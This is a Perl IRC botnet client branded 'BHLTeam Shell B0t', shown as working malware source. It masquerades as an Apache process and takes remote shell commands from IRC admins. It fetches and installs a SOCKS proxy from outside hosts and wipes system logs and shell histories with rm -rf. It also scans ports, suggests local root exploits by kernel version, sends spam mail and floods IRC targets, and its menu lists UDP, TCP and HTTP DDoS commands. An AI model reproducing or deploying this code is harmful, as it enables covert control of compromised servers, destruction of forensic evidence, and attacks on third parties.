#!/usr/bin/perl
#
###################################
#
# BHLTeam Shell B0t
#
###################################
#
use HTTP::Request;
#
use LWP::UserAgent;
#
my @ps = ("/usr/sbin/httpd","/usr/sbin/apache","/usr/local/apache/bin/httpd -DSSL");                         
my $processo  = "$ps[rand(scalar(@ps))]";
#
my $linas_max='10';
#
my $sleep='3'; # to help prevent flooding the bot out
#
###################################
#
my @adms=("underhack");
#
my @hostauth= ("i.am.not.lame.la");
#
my @canais=("#bhlteam");
#
#Put your channel here
#
my @nickname = ("sh");
#
my $nick = $nickname[rand scalar @nickname];
#
#Nickname of bot
#
my $ircname = $nickname[rand scalar @nickname];
#
chop (my $realname = 'whois me');
#
#IRC name and Realname
#
$servidor='irc.mildnet.org' unless $servidor;
#
my @portas = ("6667","6668","6669","7000"); 
#                        
my $porta  = "$portas[rand(scalar(@portas))]";
#
############################################
#
$SIG{'INT'} = 'IGNORE';
#
$SIG{'HUP'} = 'IGNORE';
#
$SIG{'TERM'} = 'IGNORE';
#
$SIG{'CHLD'} = 'IGNORE';
#
$SIG{'PS'} = 'IGNORE';
#
use IO::Socket;
#
use Socket;
#
use IO::Select;
#
chdir("/");
#
 
#
#Connect
#
$servidor="$ARGV[0]" if $ARGV[0];
#
$0="$processo"."\0"x16;;
#
my $pid=fork;
#
exit if $pid;
#
die "Masalah fork: $!" unless defined($pid);
#
 
#
our %irc_servers;
#
our %DCC;
#
my $dcc_sel = new IO::Select->new();
#
$sel_cliente = IO::Select->new();
#
sub sendraw {
#
   if ($#_ == '1') {
#
      my $socket = $_[0];
#
      print $socket "$_[1]\n";
#
 
#
   } else {
#
      print $IRC_cur_socket "$_[0]\n";
#
   }
#
}
#
 
#
sub conectar {
#
   my $meunick = $_[0];
#
   my $servidor_con = $_[1];
#
   my $porta_con = $_[2];
#
 
#
   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
#
   PeerPort=>$porta_con) or return(1);
#
   if (defined($IRC_socket)) {
#
      $IRC_cur_socket = $IRC_socket;
#
      $IRC_socket->autoflush(1);
#
      $sel_cliente->add($IRC_socket);
#
      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
#
      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
#
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
#
      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
#
      nick("$meunick");
#
      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
#
      sleep 1;
#
   }
#
}
#
 
#
my $line_temp;
#
while( 1 ) {
#
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
#
   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
#
   delete($irc_servers{''}) if (defined($irc_servers{''}));
#
   my @ready = $sel_cliente->can_read(0);
#
   next unless(@ready);
#
   foreach $fh (@ready) {
#
      $IRC_cur_socket = $fh;
#
      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
#
      $nread = sysread($fh, $msg, 4096);
#
      if ($nread == 0) {
#
         $sel_cliente->remove($fh);
#
         $fh->close;
#
         delete($irc_servers{$fh});
#
      }
#
      @lines = split (/\n/, $msg);
#
      for(my $c=0; $c<= $#lines; $c++) {
#
         $line = $lines[$c];
#
         $line=$line_temp.$line if ($line_temp);
#
         $line_temp='';
#
         $line =~ s/\r$//;
#
         unless ($c == $#lines) {
#
            parse("$line");
#
         } else {
#
            if ($#lines == 0) {
#
               parse("$line");
#
            } elsif ($lines[$c] =~ /\r$/) {
#
               parse("$line");
#
            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
#
               parse("$line");
#
            } else {
#
               $line_temp = $line;
#
            }
#
         }
#
      }
#
   }
#
}
#
 
#
sub parse {
#
   my $servarg = shift;
#
   if ($servarg =~ /^PING \:(.*)/) {
#
      sendraw("PONG :$1");
#
   } 
#
   if ($servarg =~ /004/) {
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :3[14@4-[BHLTeam B0T]-14@3] ");
#
   }elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
#
      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
#
      if ($args =~ /^\001VERSION\001$/) {
#
         notice("$pn", "\001VERSION mIRC v6.32 BHLTeam\001");
#
      }
#
      if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth ) {
#
      if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
#
         if ($onde eq "$meunick"){
#
            shell("$pn", "$args");
#
         }
#
#End of Connect
#
         if ($args =~ /^(\Q$meunick\E|\!x)\s+(.*)/ ) {
#
            my $natrix = $1;
#
            my $arg = $2;
#
            if ($arg =~ /^\!(.*)/) {
#
               ircase("$pn","$onde","$1") unless ($natrix eq "!x" and $arg =~ /^\!nick/);
#
            } elsif ($arg =~ /^\@(.*)/) {
#
               $ondep = $onde;
#
               $ondep = $pn if $onde eq $meunick;
#
               bfunc("$ondep","$1");
#
            } else {
#
               shell("$onde", "$arg");
#
            }
#
         }
#
      }
#
   }
#
######################### End of prefix
#
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
#
      if (lc($1) eq lc($meunick)) {
#
         $meunick=$4;
#
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
#
      }
#
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
#
      nick("$meunick|".int rand(9999));
#
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
#
      $meunick = $2;
#
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
#
      $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
#
      foreach my $canal (@canais) {
#
         sendraw("JOIN $canal $key");
#
      }
#
   }
#
}
#
 
#
sub bfunc {
#
   my $printl = $_[0];
#
   my $funcarg = $_[1];
#
   if (my $pid = fork) {
#
      waitpid($pid, 0);
#
   } else {
#
      if (fork) {
#
         exit;
#
      } else {
#
 
#
         if ($funcarg =~ /^ssst/) {
#
            sendraw($IRC_cur_socket, "QUIT :");
#
            $killd = "kill -9 ".fork;
#
            system (`$killd`);
#
         }
#
######################
#
#     Commands       #
#
######################
#
         if ($funcarg =~ /^commands/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@9-[BHLTeam B0T Commands List]-14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[bhlbot/Hacking Based]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3socks5");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3portscan <ip>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3logcleans");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sendmail <subject> <sender> <recipient> <message>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3system");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3tmpcleans");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3rootable");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3nmap <ip> <beginport> <endport>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");   
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cd tmp:. | for example");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Advisory/New Based]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3udpflood <host> <packet size> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3tcpflood <host> <port> <packet size> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sqlflood <host> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3killme");   
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3join #channel");   
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3part #channel");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3reset");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3voice <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3owner <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deowner <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3devoice <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3halfop <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dehalfop <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3op <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deop <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3msgflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dccflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3ctcpflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3noticeflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3channelflood");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3maxiflood <who> ");
#
}
#
 
#
         if ($funcarg =~ /^linuxhelp/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Linux Help]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Dir where you are : pwd");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Start a Perl file : perl file.pl");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Go back from dir : cd ..");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Force to Remove a file/dir : rm -rf file/dir;ls -la");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Show all files/dir with permissions : ls -lia");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find config.inc.php files : find / -type f -name config.inc.php");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find all writable folders and files : find / -perm -2 -ls");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find all .htpasswd files : find / -type f -name .htpasswd");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find all service.pwd files : find / -type f -name service.pwd");
#
         }
#
         
#
         if ($funcarg =~ /^help/) {
#
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Help Commands]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3flooding - For IRC Flooding Help");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3irc - For IRC Bot Command Help ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3ddos - For DDos Command Help");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3news - For Security News Command Help ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3hacking - For Hacking Command Help");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp - For Linux Help");
#
         }
#
 
#
         if ($funcarg =~ /^flooding/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3msgflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dccflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3ctcpflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3noticeflood <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3channelflood");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3maxiflood <who> ");
#
         }
#
         
#
         if ($funcarg =~ /^irc/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[IRC Commands]-----14@12] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3voice <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3owner <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deowner <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3devoice <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3halfop <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dehalfop <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3op <who> ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deop <who> ");
#
         }   
#
         
#
         if ($funcarg =~ /^ddos/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Ddos Commands]-----14@12] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3udpflood <host> <packet size> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3tcpflood <host> <port> <packet size> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sqlflood <host> <time>");
#
         }   
#
 
#
         if ($funcarg =~ /^news/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[News Commands]-----14@12] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3packetstorm");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3milw0rm");
#
         }   
#
 
#
         if ($funcarg =~ /^hacking/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Hacking Commands]-----14@12] ");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3multiscan <vuln> <dork>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3socks5");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3portscan <ip>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3logcleaner");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sendmail <subject> <sender> <recipient> <message>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3system");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cleartmp");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3rootable");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3nmap <ip> <beginport> <endport>");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");   
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cd tmp:. | for example");
#
         }                 
#
######################
#
#   End of  Help     #
#
######################
#
######################
#
#     Commands       #
#
######################
#
         if ($funcarg =~ /^system/) {
#
            $uname=`uname -a`;
#
            $uptime=`uptime`;
#
            $ownd=`pwd`;
#
            $distro=`cat /etc/issue`;
#
            $id=`id`;
#
            $un=`uname -sro`;
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Info BOT : 7 Servidor :Hiden : 6667");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uname -a     : 7 $uname");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uptime       : 7 $uptime");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Prosses  : 7 $processo");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12ID           : 7 $id");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Dir      : 7 $ownd");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12OS           : 7 $distro");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Owner        : 7 fuck");
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Channel      : 7 @canais");
#
         }
#
 
######################
#
#      Portscan      #
#
######################
#
         if ($funcarg =~ /^portscan (.*)/) {
#
            my $hostip="$1";
#
            @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
#
            my (@aberta, %porta_banner);
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] Scanning for open ports on ".$1." 12 started .");
#
            foreach my $porta (@portas)  {
#
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
#
                  'tcp', Timeout => 4);
#
               if ($scansock) {
#
                  push (@aberta, $porta);
#
                  $scansock->close;
#
               }
#
            }
#
 
#
            if (@aberta) {
#
               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] Open ports founded: @aberta");
#
            } else {
#
               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] No open ports foundend.");
#
            }
#
         }
#
 
#
######################
#
#  End of  Portscan  #
#
######################
#
######################
#
#Auto Install Socks V5 using Mocks#
#
######################
#
if ($funcarg =~ /^socks5/) {
#
   sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Installing Mocks please wait4");
#
      system 'cd /tmp';
#
      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';
#
      system 'tar -xvfz mocks-0.0.2.tar.gz';
#
      system 'rm -rf mocks-0.0.2.tar.gz';
#
      system 'cd mocks-0.0.2';
#
      system 'rm -rf mocks.conf';
#
      system 'curl -O http://andromeda.covers.de/221/mocks.conf';
#
      system 'touch mocks.log';
#
      system 'chmod 0 mocks.log';
#
         sleep(2);
#
      system './mocks start';
#
         sleep(4);
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Looks like its succesfully installed lets do the last things4   ");
#
 
#
      #lets grab ip
#
      $net = `/sbin/ifconfig | grep 'eth0'`;
#
      if (length($net))
#
      {
#
      $net = `/sbin/ifconfig eth0 | grep 'inet addr'`;
#
      if (!length($net))
#
      {
#
      $net = `/sbin/ifconfig eth0 | grep 'inet end.'`;
#
      }
#
         if (length($net))
#
      {
#
         chop($net);
#
         @netip = split/:/,$net;
#
         $netip[1] =~ /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/;
#
         $ip = $1 .".". $2 .".". $3 .".". $4;
#
         
#
            #and print it ^^   
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] Connect here :4 ". $ip .":8787 ");
#
         }
#
      else
#
   {
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] IP not founded ");
#
   }
#
}
#
else
#
{
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] ERROR WHILE INSTALLING MOCKS ");
#
}
#
}
#
######################
#
#        Nmap        #
#
######################
#
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
#
         my $hostip="$1";
#
         my $portstart = "$2";
#
         my $portend = "$3";
#
         my (@abertas, %porta_banner);
#
       sendraw($IRC_cur_socket, "PRIVMSG $printl : Nmap PortScan 12:. 4|  4: $1:. |.: 4Ports 12:.  4 $2-$3");
#
       foreach my $porta ($portstart..$portend){
#
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
#
    if ($scansock) {
#
                 push (@abertas, $porta);
#
                 $scansock->close;
#
                 if ($xstats){
#
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan :. |Founded  4 $porta"."/Open");
#
                 }
#
               }
#
             }
#
             if (@abertas) {
#
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| Complete ");
#
             } else {
#
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| No open ports have been founded  13");
#
             }
#
          }
#
######################
#
#    End of Nmap     #
#
######################
#
######################
#
#    Log Cleaner     #
#
######################
#
if ($funcarg =~ /^logcleans/) {
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  This process can be long, just wait");
#
    system 'rm -rf /var/log/lastlog';
#
    system 'rm -rf /var/log/wtmp';
#
   system 'rm -rf /etc/wtmp';
#
   system 'rm -rf /var/run/utmp';
#
   system 'rm -rf /etc/utmp';
#
   system 'rm -rf /var/log';
#
   system 'rm -rf /var/logs';
#
   system 'rm -rf /var/adm';
#
   system 'rm -rf /var/apache/log';
#
   system 'rm -rf /var/apache/logs';
#
   system 'rm -rf /usr/local/apache/log';
#
   system 'rm -rf /usr/local/apache/logs';
#
   system 'rm -rf /root/.bash_history';
#
   system 'rm -rf /root/.ksh_history';
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  All default log and bash_history files erased");
#
      sleep 1;
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Now Erasing the rest of the machine log files");
#
   system 'find / -name *.bash_history -exec rm -rf {} \;';
#
   system 'find / -name *.bash_logout -exec rm -rf {} \;';
#
   system 'find / -name "log*" -exec rm -rf {} \;';
#
   system 'find / -name *.log -exec rm -rf {} \;';
#
      sleep 1;
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Done! All logs erased");
#
      }
#
######################
#
# End of Log Cleaner #
#
######################
#
######################
#
#        Rootable    #
#
######################
#
if ($funcarg =~ /^rootable/) {
#
my $khost = `uname -r`;
#
my $currentid = `whoami`;
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Currently you are ".$currentid." ");
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] The kernel of this box is ".$khost." ");
#
chomp($khost);
#
 
#
   my %h;
#
   $h{'w00t'} = {
#
      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20']
#
   };
#
   
#
   $h{'brk'} = {
#
      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20']
#
   };
#
   
#
   $h{'ave'} = {
#
      vuln=>['2.4.19','2.4.20']
#
   };
#
   
#
   $h{'elflbl'} = {
#
      vuln=>['2.4.29']
#
   };
#
   
#
   $h{'elfdump'} = {
#
      vuln=>['2.4.27']
#
   };
#
   
#
   $h{'expand_stack'} = {
#
      vuln=>['2.4.29']
#
   };
#
   
#
   $h{'h00lyshit'} = {
#
      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
#
   };
#
   
#
   $h{'kdump'} = {
#
      vuln=>['2.6.13']
#
   };
#
   
#
   $h{'km2'} = {
#
      vuln=>['2.4.18','2.4.22']
#
   };
#
   
#
   $h{'krad'} = {
#
      vuln=>['2.6.11']
#
   };
#
   
#
   $h{'krad3'} = {
#
      vuln=>['2.6.11','2.6.9']
#
   };
#
   
#
   $h{'local26'} = {
#
      vuln=>['2.6.13']
#
   };
#
   
#
   $h{'loko'} = {
#
      vuln=>['2.4.22','2.4.23','2.4.24']
#
   };
#
   
#
   $h{'mremap_pte'} = {
#
      vuln=>['2.4.20','2.2.25','2.4.24']
#
   };
#
   
#
   $h{'newlocal'} = {
#
      vuln=>['2.4.17','2.4.19','2.4.18']
#
   };
#
   
#
   $h{'ong_bak'} = {
#
      vuln=>['2.4.','2.6.']
#
   };
#
   
#
   $h{'ptrace'} = {
#
      vuln=>['2.2.','2.4.22']
#
   };
#
   
#
   $h{'ptrace_kmod'} = {
#
      vuln=>['2.4.2']
#
   };
#
   
#
   $h{'ptrace24'} = {
#
      vuln=>['2.4.9']
#
   };
#
   
#
   $h{'pwned'} = {
#
      vuln=>['2.4.','2.6.']
#
   };
#
   
#
   $h{'py2'} = {
#
      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13']
#
   };
#
   
#
   $h{'raptor_prctl'} = {
#
      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13']
#
   };
#
   
#
   $h{'prctl3'} = {
#
      vuln=>['2.6.13','2.6.17','2.6.9']
#
   };
#
   
#
   $h{'remap'} = {
#
      vuln=>['2.4.']
#
   };
#
   
#
   $h{'rip'} = {
#
      vuln=>['2.2.']
#
   };
#
   
#
   $h{'stackgrow2'} = {
#
      vuln=>['2.4.29','2.6.10']
#
   };
#
   
#
   $h{'uselib24'} = {
#
      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25']
#
   };
#
   
#
   $h{'newsmp'} = {
#
      vuln=>['2.6.']
#
   };
#
   
#
   $h{'smpracer'} = {
#
      vuln=>['2.4.29']
#
   };
#
   
#
   $h{'loginx'} = {
#
      vuln=>['2.4.22']
#
   };
#
   
#
   $h{'exp.sh'} = {
#
      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13']
#
   };
#
   
#
   $h{'prctl'} = {
#
      vuln=>['2.6.']
#
   };
#
   
#
   $h{'kmdx'} = {
#
      vuln=>['2.6.','2.4.']
#
   };
#
   
#
   $h{'raptor'} = {
#
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
#
   };
#
   
#
   $h{'raptor2'} = {
#
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
#
   };
#
   
#
foreach my $key(keys %h){
#
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){
#
   if($khost=~/^$kernel/){
#
   chop($kernel) if ($kernel=~/.$/);
#
   sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Possible Local Root Exploits: ". $key ." ");
#
      }
#
   }
#
}
#
}
#
######################
#
#       MAILER       #
#
######################
#
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]  Mailer :. |  Sending Mail to : 2 $3");
#
$subject = $1;
#
$sender = $2;
#
$recipient = $3;
#
@corpo = $4;
#
$mailtype = "content-type: text/html";
#
$sendmail = '/usr/sbin/sendmail';
#
open (SENDMAIL, "| $sendmail -t");
#
print SENDMAIL "$mailtype\n";
#
print SENDMAIL "Subject: $subject\n";
#
print SENDMAIL "From: $sender\n";
#
print SENDMAIL "To: $recipient\n\n";
#
print SENDMAIL "@corpo\n\n";
#
close (SENDMAIL);
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]   Mailer :. |  Mail Sent To : 2 $recipient");
#
}
#
######################
#
#   End of MAILER    #
#
######################
#
# A /tmp cleaner
#
if ($funcarg =~ /^tmpcleans/) {
#
    system 'cd /tmp;rm -rf *';
#
         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TMPCleaner12] /tmp is Cleaned");
#
         }
#
#-#-#-#-#-#-#-#-#
#
# Flooders IRC  #
#
#-#-#-#-#-#-#-#-#         
#
# msg, @msgflood <who>
#
if ($funcarg =~ /^msgflood (.+?) (.*)/) {
#
   for($i=0; $i<=10; $i+=1){
#
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." ".$2);
#
   }
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3MSGFlood12]14 Excecuted on ".$1." ");
#
}
#
         
#
# dccflood, @dccflood <who>
#
if ($funcarg =~ /^dccflood (.*)/) {
#

   for($i=0; $i<=10; $i+=1){
#
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n");
#
   }
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3DCCFlood12]14 Excecuted on ".$1." ");
#
}     
#
